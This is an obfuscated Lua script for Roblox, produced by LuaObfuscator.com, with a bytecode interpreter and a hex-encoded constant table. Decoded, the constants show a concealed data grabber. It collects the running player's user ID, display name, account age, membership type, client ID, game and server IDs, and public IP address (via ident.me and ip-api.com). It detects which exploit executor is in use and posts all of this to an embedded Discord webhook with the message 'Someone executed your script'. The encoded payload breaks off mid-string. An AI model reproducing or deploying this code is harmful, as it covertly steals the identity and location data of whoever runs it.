--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v83=0;while true do if (v83==0) then v19=v0(v3(v30,1,1));return "";end end else local v84=v2(v0(v30,16));if v19 then local v91=0;local v92;while true do if (v91==1) then return v92;end if (v91==0) then v92=v5(v84,v19);v19=nil;v91=1;end end else return v84;end end end);local function v20(v31,v32,v33) if v33 then local v85=0;local v86;while true do if (v85==(0 -0)) then v86=(v31/((5 -3)^(v32-(1 -0))))%(((4 + 0) -2)^(((v33-(620 -(555 + 64))) -(v32-(932 -(857 + 74)))) + (569 -(367 + 201)))) ;return v86-(v86%(928 -(214 + 713))) ;end end else local v87=(1 + 1)^(v32-(1 + 0)) ;return (((v31%(v87 + v87))>=v87) and (878 -((401 -119) + 595))) or (1637 -(1523 + 114)) ;end end local function v21() local v34=0 + 0 ;local v35;while true do if (v34==(1066 -(68 + 997))) then return v35;end if (v34==(1270 -(226 + 1044))) then v35=v1(v16,v18,v18);v18=v18 + (4 -3) ;v34=118 -(32 + 85) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (959 -(892 + 65)) ;return (v37 * (610 -354)) + v36 ;end local function v23() local v38=(0 + 0) -0 ;local v39;local v40;local v41;local v42;while true do if (v38==(1 -0)) then return (v42 * 16777216) + (v41 * (65886 -(87 + 263))) + (v40 * (436 -((266 -199) + (1065 -(802 + 150))))) + v39 ;end if (v38==(0 + 0)) then v39,v40,v41,v42=v1(v16,v18,v18 + (7 -4) );v18=v18 + 4 ;v38=1;end end end local function v24() local v43=0 -0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(2 + 1)) then if (v48==(0 -0)) then if (v47==(438 -(145 + 293))) then return v49 * (430 -(44 + 386)) ;else local v104=1486 -(998 + 488) ;while true do if (v104==(0 + (0 -0))) then v48=1;v46=0 + 0 ;break;end end end elseif (v48==(1490 + 557)) then return ((v47==(1138 -(116 + 1022))) and (v49 * ((998 -(915 + 82))/((1747 -(760 + 987)) + (1913 -(1789 + 124)))))) or (v49 * NaN) ;end return v8(v49,v48-(2896 -1873) ) * (v46 + (v47/((768 -(745 + 21))^(31 + 21)))) ;end if (v43==(0 -0)) then v44=v23();v45=v23();v43=1188 -(1069 + 118) ;end if (v43==((2 + 2) -2)) then v48=v20(v45,51 -(82 -52) ,31);v49=((v20(v45,69 -37 )==(1 + 0)) and  -(1 -0)) or (886 -(261 + 624)) ;v43=3 + 0 ;end if (v43==(792 -(368 + 423))) then v46=3 -2 ;v47=(v20(v45,19 -(10 + 8) ,94 -74 ) * ((7 -5)^32)) + v44 ;v43=444 -(416 + (101 -75)) ;end end end local function v25(v50) local v51=0 + (0 -0) ;local v52;local v53;while true do if (v51==(2 + 0)) then v53={};for v93=1056 -((267 -180) + 968) , #v52 do v53[v93]=v2(v1(v3(v52,v93,v93)));end v51=(4 + 9) -10 ;end if (v51==0) then v52=nil;if  not v50 then local v99=0 + 0 ;while true do if (v99==(0 -0)) then v50=v23();if (v50==(1413 -(447 + (2127 -1161)))) then return "";end break;end end end v51=2 -1 ;end if (v51==1) then v52=v3(v16,v18,(v18 + v50) -1 );v18=v18 + v50 ;v51=1819 -(1703 + 114) ;end if (v51==(704 -(376 + 325))) then return v6(v53);end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v54=(function() return 0 + 0 ;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();local v61=(function() return;end)();while true do local v68=(function() return 0;end)();while true do if (v68==(1 -0)) then if (v54~=2) then else local v100=(function() return 65 -(30 + 35) ;end)();local v101=(function() return;end)();while true do if (v100==0) then v101=(function() return 0 -0 ;end)();while true do if (v101~=(29 -(22 + 7))) then else v61=(function() return {};end)();for v121= #".",v60 do local v122=(function() return 0 + 0 ;end)();local v123=(function() return;end)();local v124=(function() return;end)();local v125=(function() return;end)();while true do if ((0 + 0)==v122) then local v250=(function() return 1985 -(1266 + 719) ;end)();while true do if ((604 -(268 + 335))==v250) then v122=(function() return 291 -(60 + 230) ;end)();break;end if (v250==0) then v123=(function() return 0 -0 ;end)();v124=(function() return nil;end)();v250=(function() return 1;end)();end end end if ((573 -(426 + 146))~=v122) then else v125=(function() return nil;end)();while true do if (1~=v123) then else if (v124== #"!") then v125=(function() return v21()~=(0 + 0) ;end)();elseif (v124==2) then v125=(function() return v24();end)();elseif (v124~= #"nil") then else v125=(function() return v25();end)();end v61[v121]=(function() return v125;end)();break;end if (v123~=(320 -(53 + 267))) then else local v329=(function() return 1456 -(282 + 1174) ;end)();while true do if (v329~=(0 + 0)) then else v124=(function() return v21();end)();v125=(function() return nil;end)();v329=(function() return 812 -(569 + 242) ;end)();end if (v329~=(2 -1)) then else v123=(function() return 414 -(15 + 398) ;end)();break;end end end end break;end end end v101=(function() return 1 + 0 ;end)();end if (v101==(3 -2)) then v59[ #"91("]=(function() return v21();end)();v54=(function() return 1027 -(706 + 318) ;end)();break;end end break;end end end if ((1251 -(721 + 530))~=v54) then else local v102=(function() return 850 -(20 + 830) ;end)();while true do if (v102==(0 + 0)) then v55=(function() return function(v113,v114,v115) local v116=(function() return 0;end)();local v117=(function() return;end)();while true do if (v116==(126 -(116 + 10))) then v117=(function() return 0 + 0 ;end)();while true do if (v117==(1271 -(945 + 326))) then local v272=(function() return 738 -(542 + 196) ;end)();local v273=(function() return;end)();while true do if (v272==0) then v273=(function() return 0 -0 ;end)();while true do if (v273==(0 -0)) then local v370=(function() return 0 + 0 ;end)();while true do if (v370~=(700 -(271 + 429))) then else v113[v114-#"." ]=(function() return v115();end)();return v113,v114,v115;end end end end break;end end end end break;end end end;end)();v56=(function() return {};end)();v102=(function() return 1;end)();end if (v102~=1) then else v57=(function() return {};end)();v54=(function() return 1 + 0 ;end)();break;end end end break;end if (v68==(0 + 0)) then if (v54==(2 + 1)) then for v105= #".",v23() do local v106=(function() return v21();end)();if (v20(v106, #"]", #"|")~=(1500 -(1408 + 92))) then else local v108=(function() return 1086 -(461 + 625) ;end)();local v109=(function() return;end)();local v110=(function() return;end)();local v111=(function() return;end)();local v112=(function() return;end)();while true do if (v108==(1290 -(993 + 295))) then while true do if (v109~=0) then else local v227=(function() return 0 + 0 ;end)();while true do if ((405 -(118 + 287))==v227) then v110=(function() return v20(v106,1173 -(418 + 753) , #"gha");end)();v111=(function() return v20(v106, #"asd1",3 + 3 );end)();v227=(function() return 1 + 0 ;end)();end if (v227~=(1 + 0)) then else v109=(function() return  #"<";end)();break;end end end if (v109~= #"gha") then else if (v20(v111, #"gha", #"xnx")== #"|") then v112[ #"?id="]=(function() return v61[v112[ #".com"]];end)();end v56[v105]=(function() return v112;end)();break;end if (v109== #".") then local v229=(function() return 0 + 0 ;end)();while true do if (v229==(529 -(406 + 123))) then v112=(function() return {v22(),v22(),nil,nil};end)();if (v110==(0 + 0)) then local v336=(function() return 1322 -(1249 + 73) ;end)();local v337=(function() return;end)();while true do if (v336~=0) then else v337=(function() return 0 + 0 ;end)();while true do if (v337==(1145 -(466 + 679))) then v112[ #"-19"]=(function() return v22();end)();v112[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v110== #"\\") then v112[ #"91("]=(function() return v23();end)();elseif (v110==(4 -2)) then v112[ #"19("]=(function() return v23() -(2^(993 -(553 + 424))) ;end)();elseif (v110== #"-19") then local v382=(function() return 0;end)();while true do if (v382==0) then v112[ #"xxx"]=(function() return v23() -((5 -3)^(15 + 1)) ;end)();v112[ #"xnxx"]=(function() return v22();end)();break;end end end v229=(function() return 1;end)();end if (v229==(1901 -(106 + 1794))) then v109=(function() return 1 + 1 ;end)();break;end end end if (v109==(1 + 1)) then local v230=(function() return 0 -0 ;end)();while true do if ((2 -1)==v230) then v109=(function() return  #"-19";end)();break;end if (v230==(0 + 0)) then if (v20(v111, #"}", #"]")== #"[") then v112[116 -(4 + 110) ]=(function() return v61[v112[586 -(57 + 527) ]];end)();end if (v20(v111,4 -2 ,2)== #"/") then v112[ #"asd"]=(function() return v61[v112[ #"19("]];end)();end v230=(function() return 1;end)();end end end end break;end if (v108==0) then v109=(function() return 0;end)();v110=(function() return nil;end)();v108=(function() return 1428 -(41 + 1386) ;end)();end if (v108==(104 -(17 + 86))) then local v119=(function() return 0 + 0 ;end)();local v120=(function() return;end)();while true do if ((0 -0)==v119) then v120=(function() return 0 -0 ;end)();while true do if (v120==(2 -1)) then v108=(function() return 5 -3 ;end)();break;end if (v120~=0) then else local v306=(function() return 0 + 0 ;end)();while true do if (v306==(4 -3)) then v120=(function() return 167 -(122 + 44) ;end)();break;end if (v306==(0 -0)) then v111=(function() return nil;end)();v112=(function() return nil;end)();v306=(function() return 1 + 0 ;end)();end end end end break;end end end end end end for v107= #":",v23() do v57,v107,v28=(function() return v55(v57,v107,v28);end)();end return v59;end if (v54==(1330 -(797 + 532))) then local v103=(function() return 0 + 0 ;end)();while true do if (v103~=0) then else v58=(function() return {};end)();v59=(function() return {v56,v57,nil,v58};end)();v103=(function() return 2 -1 ;end)();end if (v103==(3 -2)) then v60=(function() return v23();end)();v54=(function() return 2;end)();break;end end end v68=(function() return 1 + 0 ;end)();end end end end local function v29(v62,v63,v64) local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...) local v69=v65;local v70=v66;local v71=v67;local v72=v27;local v73=732 -(476 + 255) ;local v74= -(1131 -(369 + 761));local v75={};local v76={...};local v77=v12("#",...) -(1 -0) ;local v78={};local v79={};for v88=0 -0 ,v77 do if (v88>=v71) then v75[v88-v71 ]=v76[v88 + (239 -(64 + (697 -(423 + 100)))) ];else v79[v88]=v76[v88 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do v81=v69[v73];v82=v81[1 + 0 + 0 ];if ((2981==2981) and (v82<=(47 -15))) then if (v82<=(351 -(144 + (531 -339)))) then if (v82<=(223 -(42 + 91 + 83))) then if ((493==493) and (v82<=(3 + 0))) then if (v82<=(1 + 0)) then if (v82==(0 + 0)) then local v126=0;local v127;local v128;while true do if (v126==((2275 -(326 + 445)) -(363 + 1141))) then v127=v81[1582 -(1183 + 397) ];v128={};v126=2 -(4 -3) ;end if (v126==(1 + 0)) then for v307=1, #v78 do local v308=0 + 0 ;local v309;while true do if (v308==(1975 -(1913 + 62))) then v309=v78[v307];for v359=0 + 0 , #v309 do local v360=0 -0 ;local v361;local v362;local v363;while true do if (v360==1) then v363=v361[2];if ((v362==v79) and (v363>=v127)) then v128[v363]=v362[v363];v361[1]=v128;end break;end if (((1933 -(565 + 1368))==v360) or (2467==1987)) then v361=v309[v359];v362=v361[3 -(4 -2) ];v360=1662 -(1477 + 184) ;end end end break;end end end break;end end else v79[v81[2 -0 ]]={};end elseif (v82>(2 + 0)) then local v130=856 -(564 + (681 -389)) ;local v131;while true do if (v130==(0 -0)) then v131=v81[5 -3 ];v79[v131](v13(v79,v131 + 1 ,v81[307 -(244 + 60) ]));break;end end else local v132=v81[(713 -(530 + 181)) + 0 ];local v133=v79[v81[479 -(41 + (1316 -(614 + 267))) ]];v79[v132 + (1002 -(938 + 63)) ]=v133;v79[v132]=v133[v81[4 + (32 -(19 + 13)) ]];end elseif (v82<=(1130 -((1522 -586) + (439 -250)))) then if (v82==(2 + 2)) then for v231=v81[1615 -(1565 + 48) ],v81[2 + 1 ] do v79[v231]=nil;end else local v137=v81[2];do return v79[v137](v13(v79,v137 + ((3253 -2114) -(782 + 356)) ,v81[270 -(46 + 130 + 91) ]));end end elseif ((v82>((26 -11) -9)) or (1205>1333)) then if v79[v81[2 -0 ]] then v73=v73 + (1093 -(975 + 117)) ;else v73=v81[1878 -(157 + 1718) ];end else v79[v81[2 + 0 ]]=v81[3];end elseif ((v82<=(38 -27)) or (3696<=3327)) then if ((v82<=((62 -32) -21)) or (4542==2970)) then if (v82>8) then local v140=v81[1020 -(697 + 321) ];do return v13(v79,v140,v74);end else local v141=v81[5 -3 ];do return v13(v79,v141,v74);end end elseif (v82==(21 -11)) then v79[v81[4 -2 ]]=v63[v81[3]];else local v144=v70[v81[2 + 1 ]];local v145;local v146={};v145=v10({},{__index=function(v233,v234) local v235=0 -0 ;local v236;while true do if (v235==(0 -0)) then v236=v146[v234];return v236[1228 -(322 + 905) ][v236[613 -(602 + 9) ]];end end end,__newindex=function(v237,v238,v239) local v240=0;local v241;while true do if (v240==(1189 -(449 + 740))) then v241=v146[v238];v241[873 -(826 + 46) ][v241[949 -(245 + 702) ]]=v239;break;end end end});for v242=3 -2 ,v81[4] do local v243=0;local v244;while true do if ((252<=1977) and (v243==(0 + 0))) then v73=v73 + 1 ;v244=v69[v73];v243=1;end if (v243==(1899 -(260 + 1638))) then if (v244[441 -(382 + 58) ]==12) then v146[v242-(3 -2) ]={v79,v244[8 -5 ]};else v146[v242-(1206 -(902 + 303)) ]={v63,v244[1 + 2 ]};end v78[ #v78 + (1691 -(1121 + 569)) ]=v146;break;end end end v79[v81[2]]=v29(v144,v145,v64);end elseif (v82<=(227 -(22 + 192))) then if (v82==(695 -(483 + 200))) then v79[v81[2]]=v79[v81[3]];else local v150=1463 -(1404 + 59) ;local v151;while true do if (v150==(0 -(0 -0))) then v151=v81[2 -0 ];v79[v151]=v79[v151](v79[v151 + (766 -(468 + 297)) ]);break;end end end elseif (v82>((2483 -1907) -(334 + 228))) then local v152=0;local v153;while true do if ((v152==(0 -0)) or (1436==3775)) then v153=v81[4 -(4 -2) ];do return v13(v79,v153,v153 + v81[5 -(2 + 0) ] );end break;end end else local v154=0 + 0 + 0 ;local v155;while true do if (v154==((547 -311) -(141 + 95))) then v155=v81[2 + 0 ];v79[v155]=v79[v155](v79[v155 + (2 -1) ]);break;end end end elseif (v82<=(54 -31)) then if (v82<=(5 + 14)) then if (v82<=(46 -(7 + 22))) then if (v82==16) then local v156=v81[2 + 0 ];v79[v156](v13(v79,v156 + 1 + 0 ,v81[4 -1 ]));else local v157=0;local v158;while true do if (v157==(0 + 0)) then v158=v81[165 -(92 + 71) ];v79[v158]=v79[v158](v13(v79,v158 + 1 + 0 ,v81[4 -1 ]));break;end end end elseif ((v82==(783 -(574 + 191))) or (1618<930)) then local v159=0 + 0 ;local v160;local v161;local v162;while true do if (v159==((1 + 1) -1)) then v162=v81[2 + 1 ];for v315=850 -(254 + 595) ,v162 do v161[v315]=v79[v160 + v315 ];end break;end if (v159==(126 -(55 + 45 + 26))) then v160=v81[2 -0 ];v161=v79[v160];v159=1791 -(573 + 1217) ;end end else v79[v81[5 -(1099 -(709 + 387)) ]][v81[1 + 2 ]]=v81[5 -1 ];end elseif (v82<=(960 -((2572 -(673 + 1185)) + 225))) then if (v82==20) then v79[v81[(14 -9) -3 ]]=v81[(9 -6) -0 ];else v79[v81[1 + 1 ]]=v79[v81[3 -0 ]][v81[810 -(118 + 688) ]];end elseif (v82>(70 -(25 + 23))) then for v245=v81[(1 -0) + 1 ],v81[1889 -(927 + 959) ] do v79[v245]=nil;end else local v169=0 -0 ;local v170;local v171;while true do if (v169==0) then v170=v81[735 -(16 + 716) ];v171=v79[v170];v169=1 -0 ;end if ((4723>4153) and (v169==1)) then for v318=v170 + 1 ,v81[4] do v171=v171   .. v79[v318] ;end v79[v81[99 -(11 + 86) ]]=v171;break;end end end elseif (v82<=27) then if (v82<=(60 -35)) then if ((v82>((222 + 87) -(175 + 83 + 27))) or (3654>=4654)) then local v172=0 -0 ;local v173;while true do if (v172==(0 -0)) then v173=v81[1798 -(503 + 1293) ];v79[v173]=v79[v173](v13(v79,v173 + (2 -1) ,v74));break;end end else local v174=0 + 0 ;local v175;while true do if ((951<=1496) and (v174==(1061 -(810 + 251)))) then v175=v81[2 + 0 ];v79[v175](v79[v175 + (1 -0) + 0 ]);break;end end end elseif (v82==(24 + 2)) then v79[v81[2]]=v64[v81[536 -(43 + 490) ]];else v79[v81[735 -(711 + 22) ]]=v64[v81[(3 + 8) -8 ]];end elseif (v82<=29) then if (v82>28) then if ( not v79[v81[861 -(240 + 619) ]] or (1736==571)) then v73=v73 + 1 + 0 ;else v73=v81[4 -1 ];end else do return;end end elseif ((v82<=(2 + 28)) or (896>4769)) then local v180=v81[1746 -(1344 + 400) ];do return v79[v180](v13(v79,v180 + (406 -(255 + 150)) ,v81[3 + (0 -0) ]));end elseif (v82>(17 + 14)) then local v253=v81[8 -(11 -5) ];local v254,v255=v72(v79[v253](v79[v253 + 1 ]));v74=(v255 + v253) -(3 -2) ;local v256=1739 -(404 + 1335) ;for v293=v253,v74 do local v294=406 -(183 + (2103 -(446 + 1434))) ;while true do if (v294==(0 -(1283 -(1040 + 243)))) then v256=v256 + 1 + 0 ;v79[v293]=v254[v256];break;end end end else local v257=0 + 0 ;local v258;local v259;local v260;while true do if (v257==(338 -(10 + 327))) then v260={};v259=v10({},{__index=function(v344,v345) local v346=0 + 0 ;local v347;while true do if ((v346==0) or (1045<=1020)) then v347=v260[v345];return v347[339 -(118 + 220) ][v347[1 + 1 ]];end end end,__newindex=function(v348,v349,v350) local v351=449 -(108 + 341) ;local v352;while true do if (v351==(0 + 0)) then v352=v260[v349];v352[1][v352[8 -6 ]]=v350;break;end end end});v257=1495 -(711 + 782) ;end if ((v257==2) or (1160<=328)) then for v353=1 -0 ,v81[(927 -(13 + 441)) -((1008 -738) + 199) ] do v73=v73 + (2 -1) + 0 ;local v354=v69[v73];if (v354[4 -3 ]==12) then v260[v353-(1820 -(580 + 1239)) ]={v79,v354[1 + 2 ]};else v260[v353-(1 + 0) ]={v63,v354[1170 -(645 + 522) ]};end v78[ #v78 + (1791 -(1010 + (2832 -2052))) ]=v260;end v79[v81[2]]=v29(v258,v259,v64);break;end if (v257==(0 + 0)) then v258=v70[v81[3]];v259=nil;v257=4 -3 ;end end end elseif ((3808>2924) and (v82<=(140 -92))) then if (v82<=((667 + 1209) -(1045 + 347 + 444))) then if ((3891<4919) and (v82<=(90 -54))) then if (v82<=(51 -17)) then if (v82>(538 -(351 + (456 -302)))) then local v181=v81[(863 + 713) -(1281 + 293) ];v79[v181]=v79[v181](v13(v79,v181 + (267 -(28 + 238)) ,v74));else v79[v81[2]][v81[3]]=v79[v81[8 -(7 -3) ]];end elseif (v82>35) then v79[v81[2]]=v29(v70[v81[1562 -(1381 + 178) ]],nil,v64);elseif ( not v79[v81[2 + 0 ]] or (2234<=1502)) then v73=v73 + 1 ;else v73=v81[3 + 0 ];end elseif ((v82<=(17 + 21)) or (2512<432)) then if ((v82>(127 -90)) or (1848==865)) then local v186=0 + 0 ;local v187;local v188;local v189;while true do if (v186==(471 -(381 + 89))) then v189=v81[3 + 0 + 0 ];for v319=1 + 0 ,v189 do v188[v319]=v79[v187 + v319 ];end break;end if (v186==(0 -0)) then v187=v81[1158 -(1074 + 82) ];v188=v79[v187];v186=1 -0 ;end end else v79[v81[1786 -(120 + 94 + 1129 + 441) ]]=v29(v70[v81[1458 -(990 + 465) ]],nil,v64);end elseif (v82==(17 + 22)) then local v191=v79[v81[2 + 2 ]];if  not v191 then v73=v73 + 1 + 0 ;else local v262=0 -(0 + 0) ;while true do if (v262==(1726 -(1668 + 58))) then v79[v81[2]]=v191;v73=v81[(616 + 13) -(512 + 114) ];break;end end end else local v192=0 -0 ;local v193;while true do if ((v192==0) or (4682<=4541)) then v193=v81[2];v79[v193]=v79[v193](v13(v79,v193 + (1 -0) ,v81[10 -7 ]));break;end end end elseif ((v82<=(21 + 23)) or (3026>=4046)) then if ((2008>638) and (v82<=((441 -(153 + 280)) + (97 -63)))) then if (v82>41) then if ((1775<=3233) and (v79[v81[2 + 0 ]]==v81[13 -(9 + 0) ])) then v73=v73 + 1 ;else v73=v81[1997 -(109 + 1885) ];end else local v194=0 + 0 ;local v195;while true do if (v194==(1469 -(665 + 604 + 200))) then v195=v81[3 -1 ];v79[v195]=v79[v195]();break;end end end elseif (v82==43) then local v196=v79[v81[4]];if  not v196 then v73=v73 + (816 -(98 + 717)) ;else local v264=826 -(802 + 24) ;while true do if (v264==(0 -0)) then v79[v81[2 -0 ]]=v196;v73=v81[3];break;end end end else do return v79[v81[1 + 1 ]];end end elseif (v82<=(36 + 10)) then if ((v82>45) or (4543==1997)) then local v197=v81[1 + 1 + 0 ];v79[v197]=v79[v197]();else local v199=v81[1 + 1 ];local v200,v201=v72(v79[v199](v79[v199 + (2 -1) ]));v74=(v201 + v199) -(3 -2) ;local v202=0 + 0 + 0 ;for v247=v199,v74 do local v248=0;while true do if (v248==(0 + 0)) then v202=v202 + 1 + 0 ;v79[v247]=v200[v202];break;end end end end elseif (v82>47) then if (v81[2 + 0 ]==v79[v81[(2 -0) + 2 ]]) then v73=v73 + 1 ;else v73=v81[1436 -(797 + 636) ];end else do return;end end elseif (v82<=56) then if (v82<=(252 -200)) then if (v82<=(1669 -(1427 + 119 + 73))) then if (v82>(17 + 32)) then if v79[v81[4 -2 ]] then v73=v73 + 1 + 0 ;else v73=v81[2 + 1 ];end else do return v79[v81[328 -(192 + 134) ]];end end elseif ((v82>(1327 -(316 + 960))) or (3102<728)) then v79[v81[2 + 0 ]][v81[3 + 0 ]]=v81[4 + 0 ];else local v205=0 -0 ;local v206;local v207;while true do if ((345==345) and (v205==(552 -(83 + (1135 -(89 + 578)))))) then for v324=1807 -(1202 + 604) , #v78 do local v325=0 -0 ;local v326;while true do if ((v325==(0 -0)) or (2827<378)) then v326=v78[v324];for v366=0 -0 , #v326 do local v367=v326[v366];local v368=v367[1];local v369=v367[327 -(45 + 280) ];if ((v368==v79) and (v369>=v206)) then local v375=0;while true do if ((v375==(0 + 0 + 0)) or (3476<2597)) then v207[v369]=v368[v369];v367[1 + 0 ]=v207;break;end end end end break;end end end break;end if ((3079<4794) and (v205==((0 -0) + (1049 -(572 + 477))))) then v206=v81[2];v207={};v205=1 + 0 ;end end end elseif ((4854>4464) and (v82<=54)) then if (v82==(10 + 6 + 37)) then if ((v79[v81[3 -1 ]]==v81[4]) or (4912==3758)) then v73=v73 + (1912 -(340 + 1571)) ;else v73=v81[2 + 1 ];end else local v208=v81[1774 -(1733 + 39) ];local v209=v79[v81[8 -(4 + 1) ]];v79[v208 + (1035 -(125 + 909)) ]=v209;v79[v208]=v209[v81[1952 -(1096 + 852) ]];end elseif (v82>(25 + 30)) then v73=v81[3 -0 ];else v73=v81[3 + 0 ];end elseif (v82<=60) then if ((126<=3482) and (v82<=(570 -(409 + 103)))) then if (v82>((35 + 258) -(46 + 190))) then local v215=v81[97 -(51 + 44) ];v79[v215](v79[v215 + 1 ]);else v79[v81[2]]=v63[v81[3]];end elseif (v82>(17 + 42)) then if (v81[1319 -((1200 -(84 + 2)) + 203) ]==v79[v81[4]]) then v73=v73 + (727 -(228 + 498)) ;else v73=v81[1 + 2 ];end else local v218=0 + 0 ;local v219;local v220;while true do if (v218==0) then v219=v81[666 -(174 + 489) ];v220=v79[v219];v218=2 -1 ;end if ((v218==((3140 -1234) -(830 + 1075))) or (2374==4374)) then for v327=v219 + ((379 + 146) -(303 + 221)) ,v81[4] do v220=v220   .. v79[v327] ;end v79[v81[1271 -(231 + 1038) ]]=v220;break;end end end elseif (v82<=((894 -(497 + 345)) + 10)) then if ((1575==1575) and (v82==(1223 -(171 + 991)))) then v79[v81[2]][v81[3]]=v79[v81[16 -12 ]];else local v223=v81[2];local v224=v79[v223];for v249=v223 + 1 ,v81[7 -4 ] do v7(v224,v79[v249]);end end elseif ((v82<=(157 -94)) or (2234==1455)) then v79[v81[2 + 0 + 0 ]]=v79[v81[(2 + 8) -7 ]];elseif (v82>(184 -(1453 -(605 + 728)))) then v79[v81[2 -0 ]]={};else v79[v81[6 -4 ]]=v79[v81[1251 -(80 + 31 + 1137) ]][v81[162 -((202 -111) + 67) ]];end v73=v73 + (2 -1) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!243Q00028Q00027Q004003043Q004E616D6503083Q00746F737472696E67030E3Q004D656D62657273686970547970652Q033Q00737562026Q003540030A3Q00412Q636F756E74416765026Q000840026Q00F03F030B3Q004C6F63616C506C6179657203063Q00557365724964030B3Q00446973706C61794E616D65026Q00104003043Q0067616D65030A3Q004765745365727669636503133Q00526278416E616C797469637353657276696365030B3Q00476574436C69656E74496403253Q00526F626C6F782E47616D654C61756E636865722E6A6F696E47616D65496E7374616E63652803073Q00506C61636549642Q033Q002C202203053Q004A6F62496403023Q002229030E3Q0047657450726F64756374496E666F026Q001440026Q001840030B3Q00482Q74705365727669636503073Q00506C617965727303123Q004D61726B6574706C6163655365727669636503133Q004C6F63616C697A6174696F6E53657276696365030E3Q00526F626C6F784C6F63616C65496403073Q00482Q747047657403143Q00682Q7470733A2Q2F76342E6964656E742E6D652F03163Q00682Q74703A2Q2F69702D6170692E636F6D2F6A736F6E026Q001C4003793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F3132392Q38323632313832312Q3632343230322F53494D695945486D75636B6D364574694B6F452D45554633726774345F67355A5745712Q496A366E6F627752794577504632387541466766425F4469334E372D3732525A00743Q0012063Q00014Q0017000100143Q0026353Q000E000100020004383Q000E000100204000070004000300121B001500043Q0020400016000400052Q000E001500020002002002001500150006001206001700074Q00280015001700022Q003F000800153Q0020400009000400080012063Q00093Q0026353Q00140001000A0004383Q0014000100204000040002000B00204000050004000C00204000060004000D0012063Q00023Q0026353Q002B0001000E0004383Q002B000100121B0015000F3Q002002001500150010001206001700114Q00280015001700020020020015001500122Q000E0015000200022Q003F000D00153Q001206001500133Q00121B0016000F3Q002040001600160014001206001700153Q00121B0018000F3Q002040001800180016001206001900174Q003B000E0015001900200200150003001800121B0017000F3Q0020400017001700142Q0028001500170002002040000F001500030012063Q00193Q000E3C0019003100013Q0004383Q003100012Q0017001000103Q00022400106Q0017001100113Q0012063Q001A3Q0026353Q0043000100010004383Q0043000100121B0015000F3Q0020020015001500100012060017001B4Q00280015001700022Q003F000100153Q00121B0015000F3Q0020020015001500100012060017001C4Q00280015001700022Q003F000200153Q00121B0015000F3Q0020020015001500100012060017001D4Q00280015001700022Q003F000300153Q0012063Q000A3Q0026353Q0053000100090004383Q0053000100121B0015000F3Q00204000150015001E002040000A0015001F00121B0015000F3Q002002001500150020001206001700214Q00280015001700022Q003F000B00153Q00121B0015000F3Q002002001500150020001206001700224Q00280015001700022Q003F000C00153Q0012063Q000E3Q000E3C0023005E00013Q0004383Q005E0001001206001300244Q003F001500114Q002E0015000100022Q003F001400154Q003F001500124Q003F001600134Q003F001700144Q00100015001700010004383Q007200010026353Q00020001001A0004383Q0002000100060B001100010001000D2Q000C3Q00014Q000C3Q00104Q000C3Q00054Q000C3Q00064Q000C3Q00074Q000C3Q00084Q000C3Q00094Q000C3Q000A4Q000C3Q000B4Q000C3Q000D4Q000C3Q000F4Q000C3Q000C4Q000C3Q000E4Q0017001200123Q000224001200023Q0012063Q00233Q0004383Q000200012Q00338Q002F3Q00013Q00033Q00103Q00028Q002Q033Q0073796E03123Q0069735F736972687572745F636C6F73757265030C3Q00706562635F6578656375746503093Q0053796E617073652058030B3Q007365637572655F6C6F616403083Q0053656E74696E656C030C3Q0050726F746F536D6173686572030B3Q004B524E4C5F4C4F4144454403043Q004B726E6C03073Q005369724875727403103Q006964656E746966796578656375746F7203043Q0066696E64030A3Q0053637269707457617265030B3Q005363726970742D57617265030B3Q00556E73752Q706F72746564003A3Q0012063Q00014Q0017000100013Q0026353Q0002000100010004383Q00020001001206000200013Q00263500020005000100010004383Q0005000100121B000300023Q0006320003001300013Q0004383Q0013000100121B000300033Q00061D00030013000100010004383Q0013000100121B000300043Q00061D00030013000100010004383Q00130001001206000300053Q00062700010036000100030004383Q0036000100121B000300063Q0006320003001900013Q0004383Q00190001001206000300073Q00062700010036000100030004383Q0036000100121B000300043Q0006320003001F00013Q0004383Q001F0001001206000300083Q00062700010036000100030004383Q0036000100121B000300093Q0006320003002500013Q0004383Q002500010012060003000A3Q00062700010036000100030004383Q0036000100121B000300033Q0006320003002B00013Q0004383Q002B00010012060003000B3Q00062700010036000100030004383Q0036000100121B0003000C4Q002E00030001000200200200030003000D0012060005000E4Q00280003000500020006320003003500013Q0004383Q003500010012060003000F3Q00062700010036000100030004383Q00360001001206000100104Q002C000100023Q0004383Q000500010004383Q000200012Q002F3Q00017Q00253Q00028Q00026Q00F03F030A3Q004A534F4E456E636F6465030A3Q006176617461725F75726C03473Q00682Q7470733A2Q2F692E70696E696D672E636F6D2F353634782F37352F34332F64612F37353433642Q616230613639323338352Q6361363832343562663631653732312E6A706703073Q00636F6E74656E74034Q0003063Q00656D6265647303063Q00617574686F7203043Q006E616D65031C3Q00536F6D656F6E6520657865637574656420796F7572207363726970742Q033Q0075726C03123Q00682Q7470733A2Q2F726F626C6F782E636F6D030B3Q006465736372697074696F6E03063Q00737472696E6703063Q00666F726D617403323Q002Q5F5